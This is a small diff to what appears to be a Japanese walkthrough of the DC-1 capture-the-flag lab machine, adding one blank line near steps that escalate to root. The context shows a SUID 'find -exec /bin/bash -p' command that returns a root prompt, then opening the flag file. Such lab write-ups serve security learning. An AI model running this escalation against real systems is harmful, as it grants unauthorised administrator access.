@@ -132,4 +132,5 @@ www-data@DC-1:/$ /usr/bin/find . -exec /bin/bash -p \; -quit
 # bash-4.2# 	←管理者権限のプロンプトが返ってくる
 ```
 19.フラグファイルを開く
+
 ![kekka](images/kekka.png)
